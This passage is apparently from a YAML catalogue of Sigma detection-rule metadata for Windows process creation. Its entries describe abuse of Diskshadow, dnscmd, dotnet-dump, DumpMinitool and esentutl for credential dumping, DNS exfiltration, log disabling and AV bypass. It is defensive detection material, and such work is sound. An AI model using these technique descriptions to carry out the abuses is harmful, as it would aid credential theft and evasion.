  - https://research.checkpoint.com/2022/evilplayout-attack-against-irans-state-broadcaster/
  false_positives:
  - False postitve can occur in cases where admin scripts levreage the "exec" flag
    to execute applications
  notes: ''
- detection_id: 1dde5376-a648-492e-9e54-4241dd9b0c7f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_diskshadow_script_mode_susp_ext.yml
  name: Diskshadow Script Mode - Uncommon Script Extension Execution
  description: 'Detects execution of "Diskshadow.exe" in script mode to execute an
    script with a potentially uncommon extension.

    Initial baselining of the allowed extension list is required.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/
  - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
  - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
  - https://www.lifars.com/wp-content/uploads/2022/01/GriefRansomware_Whitepaper-2.pdf
  - https://www.zscaler.com/blogs/security-research/technical-analysis-crytox-ransomware
  - https://research.checkpoint.com/2022/evilplayout-attack-against-irans-state-broadcaster/
  false_positives:
  - False postitve might occur with legitimate or uncommon extensions used internally.
    Initial baseline is required.
  notes: ''
- detection_id: fa1a7e52-3d02-435b-81b8-00da14dd66c1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_diskshadow_script_mode_susp_location.yml
  name: Diskshadow Script Mode - Execution From Potential Suspicious Location
  description: Detects execution of "Diskshadow.exe" in script mode using the "/s"
    flag where the script is located in a potentially suspicious location.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/
  - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
  - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
  - https://www.lifars.com/wp-content/uploads/2022/01/GriefRansomware_Whitepaper-2.pdf
  - https://www.zscaler.com/blogs/security-research/technical-analysis-crytox-ransomware
  - https://research.checkpoint.com/2022/evilplayout-attack-against-irans-state-broadcaster/
  false_positives:
  - False positives may occur if you execute the script from one of the paths mentioned
    in the rule. Apply additional filters that fits your org needs.
  notes: ''
- detection_id: 7e8f2d3b-9c1a-4f67-b9e8-8d9006e0e51f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dism_enable_powershell_web_access_feature.yml
  name: PowerShell Web Access Feature Enabled Via DISM
  description: Detects the use of DISM to enable the PowerShell Web Access feature,
    which could be used for remote access and potential abuse
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1548.002
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.persistence
  - attack.t1548.002
  time_window: ''
  references:
  - https://docs.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a
  - https://gist.github.com/MHaggis/7e67b659af9148fa593cf2402edebb41
  false_positives:
  - Legitimate PowerShell Web Access installations by administrators
  notes: ''
- detection_id: 43e32da2-fdd0-4156-90de-50dfd62636f9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dism_remove.yml
  name: Dism Remove Online Package
  description: Deployment Image Servicing and Management tool. DISM is used to enumerate,
    install, uninstall, configure, and update features and packages in Windows images
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism
  - https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html
  false_positives:
  - Legitimate script
  notes: ''
- detection_id: ebea773c-a8f1-42ad-a856-00cb221966e8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dll_sideload_vmware_xfer.yml
  name: DLL Sideloading by VMware Xfer Utility
  description: Detects execution of VMware Xfer utility (VMwareXferlogs.exe) from
    the non-default directory which may be an attempt to sideload arbitrary DLL
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e7888eb1-13b0-4616-bd99-4bc0c2b054b9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dllhost_no_cli_execution.yml
  name: Dllhost.EXE Execution Anomaly
  description: Detects a "dllhost" process spawning with no commandline arguments
    which is very rare to happen and could indicate process injection activity or
    malware mimicking similar system processes.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055
  time_window: ''
  references:
  - https://redcanary.com/blog/child-processes/
  - https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 98a96a5a-64a0-4c42-92c5-489da3866cb0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dns_exfiltration_tools_execution.yml
  name: DNS Exfiltration and Tunneling Tools Execution
  description: Well-known DNS Exfiltration tools execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048.001
  - T1071.004
  - T1132.001
  tags:
  - attack.exfiltration
  - attack.t1048.001
  - attack.command-and-control
  - attack.t1071.004
  - attack.t1132.001
  time_window: ''
  references:
  - https://github.com/iagox86/dnscat2
  - https://github.com/yarrick/iodine
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a4e3d776-f12e-42c2-8510-9e6ed1f43ec3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dns_susp_child_process.yml
  name: Unusual Child Process of dns.exe
  description: Detects an unexpected process spawning from dns.exe which may indicate
    activity related to remote code execution or other forms of exploitation as seen
    in CVE-2020-1350 (SigRed)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1133
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.t1133
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/unusual-child-process-of-dns-exe.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: b6457d63-d2a2-4e29-859d-4e7affc153d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dnscmd_discovery.yml
  name: Potential Discovery Activity Via Dnscmd.EXE
  description: Detects an attempt to leverage dnscmd.exe to enumerate the DNS zones
    of a domain. DNS zones used to host the DNS records for a particular domain.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques: []
  tags:
  - attack.discovery
  - attack.execution
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd
  - https://learn.microsoft.com/en-us/azure/dns/dns-zones-records
  - https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/
  false_positives:
  - Legitimate administration use
  notes: ''
- detection_id: f63b56ee-3f79-4b8a-97fb-5c48007e8573
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml
  name: New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE
  description: Detects the installation of a DNS plugin DLL via ServerLevelPluginDll
    parameter in registry, which can be used to execute code in context of the DNS
    server (restart required)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  - attack.t1112
  time_window: ''
  references:
  - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
  - https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 81ebd28b-9607-4478-bf06-974ed9d53ed7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dnx_execute_csharp_code.yml
  name: Potential Application Whitelisting Bypass via Dnx.EXE
  description: 'Detects the execution of Dnx.EXE. The Dnx utility allows for the execution
    of C# code.

    Attackers might abuse this in order to bypass application whitelisting.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027.004
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.t1027.004
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Csi/
  - https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/
  false_positives:
  - Legitimate use of dnx.exe by legitimate user
  notes: ''
- detection_id: d80d5c81-04ba-45b4-84e4-92eba40e0ad3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dotnet_arbitrary_dll_csproj_execution.yml
  name: Arbitrary DLL or Csproj Code Execution Via Dotnet.EXE
  description: Detects execution of arbitrary DLLs or unsigned code via a ".csproj"
    files via Dotnet.EXE.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/
  - https://twitter.com/_felamos/status/1204705548668555264
  - https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/
  false_positives:
  - Legitimate administrator usage
  notes: ''
- detection_id: 9257c05b-4a4a-48e5-a670-b7b073cf401b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dotnet_trace_lolbin_execution.yml
  name: Binary Proxy Execution Via Dotnet-Trace.EXE
  description: Detects commandline arguments for executing a child process via dotnet-trace.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/bohops/status/1740022869198037480
  false_positives:
  - Legitimate usage of the utility in order to debug and trace a program.
  notes: ''
- detection_id: 53d8d3e1-ca33-4012-adf3-e05a4d652e34
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dotnetdump_memory_dump.yml
  name: Process Memory Dump Via Dotnet-Dump
  description: 'Detects the execution of "dotnet-dump" with the "collect" flag. The
    execution could indicate potential process dumping of critical processes such
    as LSASS.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/dotnet/core/diagnostics/dotnet-dump#dotnet-dump-collect
  - https://twitter.com/bohops/status/1635288066909966338
  false_positives:
  - Process dumping is the expected behavior of the tool. So false positives are expected
    in legitimate usage. The PID/Process Name of the process being dumped needs to
    be investigated
  notes: ''
- detection_id: 9fc3072c-dc8f-4bf7-b231-18950000fadd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_driverquery_recon.yml
  name: Potential Recon Activity Using DriverQuery.EXE
  description: Detect usage of the "driverquery" utility to perform reconnaissance
    on installed drivers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques: []
  tags:
  - attack.discovery
  time_window: ''
  references:
  - https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/
  - https://www.vmray.com/cyber-security-blog/analyzing-ursnif-behavior-malware-sandbox/
  - https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html
  false_positives:
  - Legitimate usage by some scripts might trigger this as well
  notes: ''
- detection_id: a20def93-0709-4eae-9bd2-31206e21e6b2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_driverquery_usage.yml
  name: DriverQuery.EXE Execution
  description: Detect usage of the "driverquery" utility. Which can be used to perform
    reconnaissance on installed drivers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques: []
  tags:
  - attack.discovery
  time_window: ''
  references:
  - https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/
  - https://www.vmray.com/cyber-security-blog/analyzing-ursnif-behavior-malware-sandbox/
  - https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html
  false_positives:
  - Legitimate use by third party tools in order to investigate installed drivers
  notes: ''
- detection_id: 01c42d3c-242d-4655-85b2-34f1739632f7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dsacls_abuse_permissions.yml
  name: Potentially Over Permissive Permissions Granted Using Dsacls.EXE
  description: Detects usage of Dsacls to grant over permissive permissions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://ss64.com/nt/dsacls.html
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)
  false_positives:
  - Legitimate administrators granting over permissive permissions to users
  notes: ''
- detection_id: bac9fb54-2da7-44e9-988f-11e9a5edbc0c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dsacls_password_spray.yml
  name: Potential Password Spraying Attempt Using Dsacls.EXE
  description: Detects possible password spraying attempts using Dsacls
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/using-dsacls-to-check-ad-object-permissions#password-spraying-anyone
  - https://ss64.com/nt/dsacls.html
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)
  false_positives:
  - Legitimate use of dsacls to bind to an LDAP session
  notes: ''
- detection_id: 3bad990e-4848-4a78-9530-b427d854aac0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dsquery_domain_trust_discovery.yml
  name: Domain Trust Discovery Via Dsquery
  description: Detects execution of "dsquery.exe" for domain trust discovery
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1482
  tags:
  - attack.discovery
  - attack.t1482
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1482/T1482.md
  - https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb?gi=41b97a644843
  false_positives:
  - Legitimate use of the utilities by legitimate user for legitimate reason
  notes: ''
- detection_id: 7124aebe-4cd7-4ccb-8df0-6d6b93c96795
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dtrace_kernel_dump.yml
  name: Suspicious Kernel Dump Using Dtrace
  description: Detects suspicious way to dump the kernel on Windows systems using
    dtrace.exe, which is available on Windows systems since Windows 10 19H1
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1474899714290208777?s=12
  - https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/dtrace
  false_positives:
  - Unknown
  notes: ''
- detection_id: 129966c9-de17-4334-a123-8b58172e664d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dump64_defender_av_bypass_rename.yml
  name: Potential Windows Defender AV Bypass Via Dump64.EXE Rename
  description: 'Detects when a user is potentially trying to bypass the Windows Defender
    AV by renaming a tool to dump64.exe and placing it in the Visual Studio folder.

    Currently the rule is covering only usage of procdump but other utilities can
    be added in order to increase coverage.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - time_window_aggregation
  - repeated_or_escalation_behavior
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1460597833917251595
  false_positives:
  - Unknown
  notes: ''
- detection_id: dee0a7a3-f200-4112-a99b-952196d81e42
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dumpminitool_execution.yml
  name: DumpMinitool Execution
  description: Detects the use of "DumpMinitool.exe" a tool that allows the dump of
    process memory via the use of the "MiniDumpWriteDump"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  - attack.t1003.001
  - attack.credential-access
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1511415432888131586
  - https://twitter.com/mrd0x/status/1511489821247684615
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/DumpMinitool/
  - https://gist.github.com/nasbench/6d58c3c125e2fa1b8f7a09754c1b087f
  false_positives:
  - Unknown
  notes: ''
- detection_id: eb1c4225-1c23-4241-8dd4-051389fde4ce
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dumpminitool_susp_execution.yml
  name: Suspicious DumpMinitool Execution
  description: Detects suspicious ways to use the "DumpMinitool.exe" binary
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1036
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.t1036
  - attack.t1003.001
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1511415432888131586
  - https://twitter.com/mrd0x/status/1511489821247684615
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/DumpMinitool/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 60f16a96-db70-42eb-8f76-16763e333590
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_dxcap_arbitrary_binary_execution.yml
  name: New Capture Session Launched Via DXCap.EXE
  description: 'Detects the execution of "DXCap.EXE" with the "-c" flag, which allows
    a user to launch any arbitrary binary or windows package through DXCap itself.
    This can be abused to potentially bypass application whitelisting.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dxcap/
  - https://twitter.com/harr0ey/status/992008180904419328
  false_positives:
  - Legitimate execution of dxcap.exe by legitimate user
  notes: ''
- detection_id: 7df1713a-1a5b-4a4b-a071-dc83b144a101
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_esentutl_params.yml
  name: Esentutl Gather Credentials
  description: Conti recommendation to its affiliates to use esentutl to access NTDS
    dumped file. Trickbot also uses this utilities to get MSEdge info via its module
    pwgrab.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003
  - attack.t1003.003
  - attack.s0404
  time_window: ''
  references:
  - https://twitter.com/vxunderground/status/1423336151860002816
  - https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/
  false_positives:
  - To be determined
  notes: ''
- detection_id: e7be6119-fc37-43f0-ad4f-1f3f99be2f9f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_esentutl_sensitive_file_copy.yml
  name: Copying Sensitive Files with Credential Data
  description: Files with well-known filenames (sensitive files with credential data)
    copying
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.002
  - attack.t1003.003
  - car.2013-07-001
  - attack.s0404
  time_window: ''
  references:
  - https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  - https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/
  - https://github.com/LOLBAS-Project/LOLBAS/blob/2cc01b01132b5c304027a658c698ae09dd6a92bf/yml/OSBinaries/Esentutl.yml
  false_positives:
  - Copying sensitive files for legitimate use (eg. backup) or forensic investigation
    by legitimate incident responder or forensic investigator.
  notes: ''
- detection_id: 6a69f62d-ce75-4b57-8dce-6351eb55b362
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_esentutl_webcache.yml
  name: Esentutl Steals Browser Information
  description: One way Qbot steals sensitive information is by extracting browser
    data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1005
  tags:
  - attack.collection
  - attack.t1005
  time_window: ''
  references:
  - https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/
  - https://redcanary.com/threat-detection-report/threats/qbot/
  - https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 1a4bd6af-99ac-4466-b5b2-7b72b4a05462
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_event_logging_disable_via_key_minint.yml
  name: Security Event Logging Disabled via MiniNt Registry Key - Process
  description: 'Detects attempts to disable security event logging by adding the `MiniNt`
    registry key.

    This key is used to disable the Windows Event Log service, which collects and
    stores event logs from the operating system and applications.

    Adversaries may want to disable this service to prevent logging of security events
    that could be used to detect their activities.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1562.002
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1562.002
  - attack.t1112
  - car.2022-03-001
  time_window: ''
  references:
  - https://www.hackingarticles.in/defense-evasion-windows-event-logging-t1562-002/
  false_positives:
  - Highly Unlikely
  notes: ''
- detection_id: be344333-921d-4c4d-8bb8-e584cf584780
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_eventvwr_susp_child_process.yml
  name: Potentially Suspicious Event Viewer Child Process
  description: Detects uncommon or suspicious child processes of "eventvwr.exe" which
    might indicate a UAC bypass attempt
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  - car.2019-04-001
  time_window: ''
  references:
  - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
  - https://www.hybrid-analysis.com/sample/e122bc8bf291f15cab182a5d2d27b8db1e7019e4e96bb5cdbd1dfe7446f3f51f?environmentId=100
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9f107a84-532c-41af-b005-8d12a607639f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_expand_cabinet_files.yml
  name: Potentially Suspicious Cabinet File Expansion
  description: Detects the expansion or decompression of cabinet files from potentially
    suspicious or uncommon locations, e.g. seen in Iranian MeteorExpress related attacks
  query_language: sigma
